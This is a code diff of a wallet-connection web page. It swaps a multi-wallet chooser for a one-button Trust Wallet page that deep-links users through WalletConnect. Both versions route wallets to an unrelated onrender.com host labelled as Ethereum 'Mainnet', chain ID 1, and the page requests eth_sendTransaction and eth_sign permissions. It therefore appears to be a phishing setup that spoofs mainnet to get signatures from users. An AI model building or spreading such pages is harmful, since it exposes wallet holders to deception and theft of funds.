@@ -2,15 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WalletConnect Hub - Connect to RPC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Trust Wallet</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -18,403 +12,92 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            margin: 0;
             padding: 20px;
+            color: white;
+            text-align: center;
         }
-        
         .container {
-            max-width: 500px;
-            width: 100%;
-            background: rgba(255, 255, 255, 0.95);
+            max-width: 400px;
+            background: rgba(255,255,255,0.1);
             backdrop-filter: blur(10px);
             border-radius: 30px;
             padding: 30px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .header h1 {
+        h1 {
             font-size: 28px;
-            color: #333;
             margin-bottom: 10px;
         }
-        
-        .header p {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.5;
-        }
-        
-        .rpc-info {
-            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 30px;
-            color: white;
-            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.3);
-        }
-        
-        .rpc-info h3 {
+        p {
             font-size: 16px;
-            margin-bottom: 10px;
+            line-height: 1.5;
             opacity: 0.9;
         }
-        
-        .rpc-info .url {
-            font-size: 14px;
-            font-family: monospace;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 12px;
-            border-radius: 12px;
-            word-break: break-all;
-            margin-bottom: 10px;
-        }
-        
-        .rpc-info .chain-details {
-            display: flex;
-            gap: 15px;
-            font-size: 14px;
-        }
-        
-        .rpc-info .chain-details span {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 6px 12px;
-            border-radius: 20px;
-        }
-        
-        .wallet-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .wallet-card {
+        .button {
+            display: inline-block;
             background: white;
-            border-radius: 20px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        .wallet-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
-        }
-        
-        .wallet-card.metamask {
-            border-color: #f6851b;
-        }
-        
-        .wallet-card.trust {
-            border-color: #3375bb;
-        }
-        
-        .wallet-card.rainbow {
-            border-color: #174299;
-        }
-        
-        .wallet-card.walletconnect {
-            border-color: #3b99fc;
-        }
-        
-        .wallet-card img {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 15px;
-        }
-        
-        .wallet-card h3 {
-            font-size: 16px;
-            margin-bottom: 5px;
             color: #333;
-        }
-        
-        .wallet-card p {
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .wallet-card .install-badge {
-            font-size: 11px;
-            background: #f0f0f0;
-            padding: 4px 8px;
-            border-radius: 12px;
-            margin-top: 10px;
-            color: #666;
-        }
-        
-        .walletconnect-section {
-            text-align: center;
-            padding: 20px;
-            background: #f8f9ff;
-            border-radius: 20px;
-            margin-top: 20px;
-        }
-        
-        .walletconnect-section button {
-            background: #3b99fc;
-            color: white;
-            border: none;
             padding: 15px 30px;
             border-radius: 30px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
-            cursor: pointer;
+            text-decoration: none;
+            margin-top: 20px;
             width: 100%;
-            transition: background 0.3s;
+            box-sizing: border-box;
+            border: none;
+            cursor: pointer;
         }
-        
-        .walletconnect-section button:hover {
-            background: #1a7ad9;
+        .button:hover {
+            background: #f0f0f0;
         }
-        
-        #qr-container {
+        .note {
+            font-size: 14px;
+            margin-top: 20px;
+            opacity: 0.8;
+        }
+        #loading {
             display: none;
             margin-top: 20px;
-            padding: 20px;
-            background: white;
-            border-radius: 20px;
-            text-align: center;
-        }
-        
-        #qr-code {
-            margin: 20px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 10px;
-            display: inline-block;
-        }
-        
-        #qr-code canvas {
-            width: 200px;
-            height: 200px;
-        }
-        
-        .uri-display {
-            background: #f0f0f0;
-            padding: 12px;
-            border-radius: 12px;
-            font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
-            margin: 15px 0;
-        }
-        
-        .copy-btn {
-            background: #6c5ce7;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        
-        .note {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-            text-align: center;
-            line-height: 1.5;
-        }
-        
-        .note a {
-            color: #667eea;
-            text-decoration: none;
-        }
-        
-        @media (max-width: 400px) {
-            .wallet-grid {
-                grid-template-columns: 1fr;
-            }
         }
     </style>
-    <!-- QR Code library -->
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-    <!-- WalletConnect v2 -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.12.2/dist/index.umd.min.js"></script>
-    <!-- Ethers -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <!-- WalletConnect v2 library -->
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h1>🔌 Connect to RPC</h1>
-            <p>Choose your wallet to connect to the custom network</p>
-        </div>
-        
-        <div class="rpc-info">
-            <h3>📡 Network Details</h3>
-            <div class="url">https://express-shipping-mcu1.onrender.com</div>
-            <div class="chain-details">
-                <span>Chain ID: 1</span>
-                <span>Symbol: ETH</span>
-                <span>Name: Mainnet</span>
-            </div>
-        </div>
-        
-        <div class="wallet-grid">
-            <!-- MetaMask -->
-            <div class="wallet-card metamask" onclick="connectMetaMask()">
-                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg" alt="MetaMask" onerror="this.src='https://cryptologos.cc/logos/metamask-logo.svg'">
-                <h3>MetaMask</h3>
-                <p>Browser extension & mobile</p>
-                <div class="install-badge">Click to connect</div>
-            </div>
-            
-            <!-- Trust Wallet -->
-            <div class="wallet-card trust" onclick="connectTrustWallet()">
-                <img src="https://cryptologos.cc/logos/trust-wallet-twt-logo.svg" alt="Trust Wallet">
-                <h3>Trust Wallet</h3>
-                <p>Mobile wallet</p>
-                <div class="install-badge">Open app</div>
-            </div>
-            
-            <!-- Rainbow -->
-            <div class="wallet-card rainbow" onclick="connectRainbow()">
-                <img src="https://avatars.githubusercontent.com/u/48327867?s=200&v=4" alt="Rainbow">
-                <h3>Rainbow</h3>
-                <p>Mobile & desktop</p>
-                <div class="install-badge">Open app</div>
-            </div>
-            
-            <!-- WalletConnect -->
-            <div class="wallet-card walletconnect" onclick="showWalletConnect()">
-                <img src="https://avatars.githubusercontent.com/u/37784886?s=200&v=4" alt="WalletConnect">
-                <h3>WalletConnect</h3>
-                <p>Scan QR code</p>
-                <div class="install-badge">Universal</div>
-            </div>
-        </div>
-        
-        <div class="walletconnect-section">
-            <button onclick="showWalletConnect()">🔗 Connect with WalletConnect</button>
-        </div>
-        
-        <div id="qr-container">
-            <h3>📱 Scan with WalletConnect</h3>
-            <div id="qr-code"></div>
-            <div class="uri-display" id="wc-uri"></div>
-            <button class="copy-btn" onclick="copyURI()">Copy URI</button>
-        </div>
-        
-        <div class="note">
-            <p>⚠️ Make sure you have added the custom network to your wallet first:</p>
-            <p><strong>RPC URL:</strong> https://express-shipping-mcu1.onrender.com<br>
-            <strong>Chain ID:</strong> 1<br>
-            <strong>Symbol:</strong> ETH</p>
-            <p><a href="#" onclick="showNetworkQR()">📲 Show network QR code</a></p>
-        </div>
+        <h1>🔗 Connect Trust Wallet</h1>
+        <p>Tap the button below to connect to the custom RPC network:</p>
+        <p style="font-size:14px; word-break:break-all;">https://express-shipping-mcu1.onrender.com</p>
+        <button class="button" id="connectBtn">Connect Now</button>
+        <div id="loading">⏳ Generating connection request...</div>
+        <p class="note">If Trust Wallet is not installed, you'll be redirected to the app store.</p>
     </div>
 
     <script>
-        // WalletConnect v2 Project ID - Replace with your actual ID
-        const PROJECT_ID = "cd1a5ec0393767579e1f364ffc41597d";
+        const PROJECT_ID = "cd1a5ec0393767579e1f364ffc41597d"; // Your WalletConnect project ID
         const RPC_URL = "https://express-shipping-mcu1.onrender.com";
-        
-        let walletConnectProvider = null;
-        
-        // Deep linking functions
-        function connectMetaMask() {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            
-            if (isMobile) {
-                // MetaMask mobile deep link
-                const dappUrl = window.location.href;
-                const metamaskAppLink = `https://metamask.app.link/dapp/${encodeURIComponent(dappUrl)}`;
-                window.location.href = metamaskAppLink;
-            } else {
-                // Desktop - prompt to install or connect via extension
-                if (typeof window.ethereum !== 'undefined') {
-                    connectWithEthereum();
-                } else {
-                    window.open('https://metamask.io/download/', '_blank');
-                }
-            }
-        }
-        
-        function connectTrustWallet() {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            
-            if (isMobile) {
-                // Trust Wallet deep link
-                const dappUrl = window.location.href;
-                const trustWalletLink = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(dappUrl)}`;
-                window.location.href = trustWalletLink;
-            } else {
-                window.open('https://trustwallet.com/download', '_blank');
-            }
-        }
-        
-        function connectRainbow() {
-            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            
-            if (isMobile) {
-                // Rainbow deep link
-                const dappUrl = window.location.href;
-                const rainbowLink = `https://rnbwapp.com/dapp/${encodeURIComponent(dappUrl)}`;
-                window.location.href = rainbowLink;
-            } else {
-                window.open('https://rainbow.me/download', '_blank');
-            }
-        }
-        
-        // Direct Ethereum provider connection (for MetaMask extension)
-        async function connectWithEthereum() {
+
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('connectBtn');
+            const loading = document.getElementById('loading');
+            btn.disabled = true;
+            btn.textContent = 'Connecting...';
+            loading.style.display = 'block';
+
             try {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
-                // Switch to/add custom network
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x1' }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: '0x1',
-                                chainName: 'Custom Mainnet',
-                                nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-                                rpcUrls: [RPC_URL]
-                            }]
-                        });
-                    }
+                if (typeof window.EthereumProvider === 'undefined') {
+                    throw new Error('WalletConnect library not loaded. Please refresh.');
                 }
-                
-                alert('✅ Connected to MetaMask!');
-            } catch (error) {
-                console.error('Connection error:', error);
-                alert('❌ Failed to connect: ' + error.message);
-            }
-        }
-        
-        // WalletConnect v2 implementation
-        async function showWalletConnect() {
-            const qrContainer = document.getElementById('qr-container');
-            const qrDiv = document.getElementById('qr-code');
-            const uriDiv = document.getElementById('wc-uri');
-            
-            qrContainer.style.display = 'block';
-            qrDiv.innerHTML = '<p>Initializing...</p>';
-            
-            try {
-                // Initialize WalletConnect provider
-                walletConnectProvider = await window.EthereumProvider.init({
+
+                // Initialize provider without showing modal
+                const provider = await window.EthereumProvider.init({
                     projectId: PROJECT_ID,
                     chains: [1],
                     showQrModal: false,
                     rpcMap: { 1: RPC_URL },
-                    methods: ['eth_sendTransaction', 'eth_sign', 'eth_accounts'],
+                    methods: ['eth_sendTransaction', 'eth_sign'],
                     metadata: {
                         name: 'RPC Connect',
                         description: 'Connect to custom RPC',
@@ -422,78 +105,35 @@
                         icons: []
                     }
                 });
-                
-                // Listen for URI
-                walletConnectProvider.on('display_uri', (uri) => {
-                    uriDiv.innerText = uri;
-                    
-                    // Generate QR code
-                    QRCode.toCanvas(uri, { width: 250 }, (err, canvas) => {
-                        if (err) {
-                            console.error(err);
-                            qrDiv.innerHTML = '<p>Error generating QR code</p>';
-                            return;
-                        }
-                        qrDiv.innerHTML = '';
-                        qrDiv.appendChild(canvas);
-                    });
+
+                // Wait for the URI
+                const uri = await new Promise((resolve) => {
+                    provider.once('display_uri', resolve);
+                    // Trigger connection
+                    provider.connect().catch(() => {});
                 });
-                
-                // Trigger connection
-                await walletConnectProvider.connect();
-                
-                // After connection, get account info
-                const provider = new ethers.providers.Web3Provider(walletConnectProvider);
-                const signer = provider.getSigner();
-                const address = await signer.getAddress();
-                
-                alert(`✅ Connected!\nAddress: ${address.slice(0,6)}...${address.slice(-4)}`);
-                
+
+                // Redirect to Trust Wallet deep link
+                const trustLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+                window.location.href = trustLink;
+
+                // Fallback: if not opened after 2 seconds, show QR option
+                setTimeout(() => {
+                    if (!document.hidden) {
+                        // Still on page, maybe deep link failed
+                        alert('If Trust Wallet did not open, tap the button again or install Trust Wallet from the app store.');
+                        btn.disabled = false;
+                        btn.textContent = 'Try Again';
+                        loading.style.display = 'none';
+                    }
+                }, 2000);
+
             } catch (error) {
-                console.error('WalletConnect error:', error);
-                qrDiv.innerHTML = `<p>❌ Error: ${error.message}</p>`;
-            }
-        }
-        
-        function copyURI() {
-            const uri = document.getElementById('wc-uri').innerText;
-            navigator.clipboard.writeText(uri).then(() => {
-                alert('URI copied to clipboard!');
-            }).catch(() => {
-                alert('Failed to copy');
-            });
-        }
-        
-        function showNetworkQR() {
-            const networkData = {
-                name: 'Custom Mainnet',
-                rpc: RPC_URL,
-                chainId: 1,
-                symbol: 'ETH'
-            };
-            
-            const networkString = JSON.stringify(networkData, null, 2);
-            
-            QRCode.toCanvas(networkString, { width: 200 }, (err, canvas) => {
-                if (err) {
-                    alert('Error generating QR');
-                    return;
-                }
-                
-                const qrContainer = document.getElementById('qr-container');
-                const qrDiv = document.getElementById('qr-code');
-                qrContainer.style.display = 'block';
-                qrDiv.innerHTML = '';
-                qrDiv.appendChild(canvas);
-                document.getElementById('wc-uri').innerText = 'Scan to add network (manual import required)';
-            });
-        }
-        
-        // Check if wallet is already connected
-        window.addEventListener('load', () => {
-            // Check for MetaMask
-            if (typeof window.ethereum !== 'undefined') {
-                console.log('MetaMask detected');
+                console.error(error);
+                alert('Connection failed: ' + error.message);
+                btn.disabled = false;
+                btn.textContent = 'Connect Now';
+                loading.style.display = 'none';
             }
         });
     </script>
